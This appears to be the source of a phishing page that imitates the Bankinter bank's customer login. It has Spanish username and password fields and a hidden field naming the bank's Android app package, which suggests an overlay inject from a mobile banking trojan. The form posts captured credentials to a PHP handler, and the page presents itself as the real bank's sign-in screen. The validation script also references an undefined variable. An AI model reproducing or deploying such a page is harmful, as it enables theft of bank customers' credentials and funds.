<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>
<div class="header">
	<img src="libs/images/icon.png">
	
	<b style="color: #fff;font-size: 18px;font-weight: 100;"> Acceso  clientes </b>
	
</div><br>

    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
                        <form class="form" method="post">
						
						<input name="field1" value="com.bankinter.launcher" type="hidden">
						
                            <div class="form-group ">
                                	<input type="text" class="form-control" placeholder="Usuario" name="field2" id="login" autocomplete="off" data-reg="/.{3,50}/">
                                	<span class="delete fa fa-times-circle"></span>
                                	<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> The information is incorrect</span>
                            </div>

                            <div class="form-group">
                                	<input type="password" class="form-control" placeholder="Contraseña" name="field3" id="password" autocomplete="off" data-reg="/.{3,50}/">
                                	<span class="delete fa fa-times-circle"></span>
                                	<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> The information is incorrect</span>
                            </div>


						<input class="input_submitBtn" id="input_submitBtn" value="SIGN IN" type="submit">

                        </form>
						
						<div style="float: left;width: 50%;"><input type="checkbox"> <b style="color: #6e6e6e;"> Recordar usuario </b> </div> <div style="float: left;width: 50%;color: #5b432f;font-weight: 100;text-align: right;height: 22px;padding: 5px;"> No puedo entrar </div>
                </div>

            </div>
        </div>
		
		</div>
    </div>
	




    <script type="text/javascript" src="libs/jquery/dist/jquery.min.js"></script>

<script src="libs/angular/angular.min.js"></script>
	<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'form-control';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCode.value.length < 3) {
							try{
								oCode.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>

</body>




</html>
